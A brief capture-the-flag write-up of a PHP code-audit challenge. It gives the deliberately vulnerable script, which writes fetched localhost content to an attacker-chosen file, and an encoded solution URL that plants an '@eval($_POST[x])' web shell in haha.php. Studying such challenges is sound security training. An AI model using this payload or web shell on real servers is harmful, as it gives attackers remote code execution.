# Challenge
```php 
<?php
if(isset($_GET) && !empty($_GET)){
    $url = $_GET['file'];
    $path = 'upload/'.$_GET['path'];
}else{
    show_source(__FILE__);
    exit();
}
 
if(strpos($path,'..') > -1){
    die('SYCwaf!');
}
 
if(strpos($url,'http://127.0.0.1/') === 0){
    file_put_contents($path, file_get_contents($url));
    echo "console.log($path update successed!)";
}else{
    echo "Hello.Geeker";
}
 
```

# Solution

```
?path=haha.php&file=http%3A%2f%2f127.0.0.1%2fphp_challenge%2f45.php%3Fpath%3D%253C%253Fphp%2520@eval%2528%2524_POST%255Bx%255D%2529%253B%253F%253E%26file%3Dhttp%3A%2f%2f127.0.0.1%2fphp_challenge%2f45.php
```

解法同31



# Refference 

+ [一道php代码审计题目的分析](https://b.zlweb.cc/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%88%86%E6%9E%90.html)